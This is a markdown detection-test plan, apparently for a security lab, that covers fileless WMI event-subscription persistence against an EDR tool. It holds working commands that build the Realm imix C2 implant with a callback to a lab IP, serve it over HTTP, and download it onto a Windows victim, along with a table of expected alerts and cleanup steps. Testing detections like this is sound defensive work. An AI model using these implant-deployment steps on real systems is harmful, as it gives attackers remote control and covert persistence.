# Test: Persistence — WMI event subscription, fileless (T1546.003)

**Chain:** an `__EventFilter` → `CommandLineEventConsumer` binding — persistence with **no
autostart key, no service, no file**: a WMI binding that executes a command when a system
event occurs. The advanced CCDC persistence.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).

on the victim first.

**Victim (elevated PowerShell):** `.\test.ps1` (uses a CPU-utilization trigger that fires
within ~60s; the classic form uses interval timers or logon events).

**Expected alerts:**

| Rule | Sev | Trigger |
|---|---|---|
| `PERS-WMI-SUB` | critical | auditor enumerates `root\subscription` (all three classes) and diffs |
| `EVT-4688-TEMP` + `PROG-IMPLANT-LAUNCH` | high/crit | when the consumer fires and runs the implant |

**Why critical:** fileless — nothing on disk to signature. The subscription objects in the
WMI namespace ARE the persistence; only namespace enumeration catches it.

**Cleanup:** global cleanup removes the three objects; the test script prints the manual
`Remove-WmiObject` commands.
